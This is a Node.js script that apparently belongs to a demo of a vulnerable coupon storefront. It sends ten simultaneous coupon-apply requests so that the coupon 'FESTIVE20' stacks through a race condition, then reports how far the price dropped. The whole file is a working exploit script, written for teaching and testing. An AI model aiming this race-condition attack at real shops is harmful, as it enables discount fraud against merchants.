// Race condition attack script for the coupon storefront demo.
//
// Usage:
//   node attack.js https://your-storefront.onrender.com
//
// Requires Node 18+ (built-in fetch).

const TARGET = process.argv[2];
const CONCURRENT_REQUESTS = 10;

if (!TARGET) {
  console.error("Usage: node attack.js <server-url>");
  process.exit(1);
}

async function applyCoupon() {
  const res = await fetch(`${TARGET}/api/apply-coupon`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ code: "FESTIVE20" }),
  });
  return res.json();
}

async function getStatus() {
  const res = await fetch(`${TARGET}/api/cart-status`);
  return res.json();
}

async function main() {
  console.log(`Target: ${TARGET}`);
  console.log("Status before attack:", await getStatus());

  console.log(`\nFiring ${CONCURRENT_REQUESTS} concurrent /api/apply-coupon requests...`);
  const results = await Promise.all(
    Array.from({ length: CONCURRENT_REQUESTS }, () => applyCoupon())
  );

  const successes = results.filter((r) => r.success).length;
  console.log(`\n${successes} out of ${CONCURRENT_REQUESTS} requests succeeded.`);

  const finalStatus = await getStatus();
  console.log("Status after attack:", finalStatus);

  if (successes > 1) {
    console.log(`\n✅ Race condition confirmed — coupon applied ${successes} times. Price dropped from ₹6499 to ₹${finalStatus.price}.`);
  } else {
    console.log("\n❌ No race condition observed this run — try again, or use POST /api/reset first.");
  }
}

main().catch((e) => console.error("Attack script failed:", e.message));
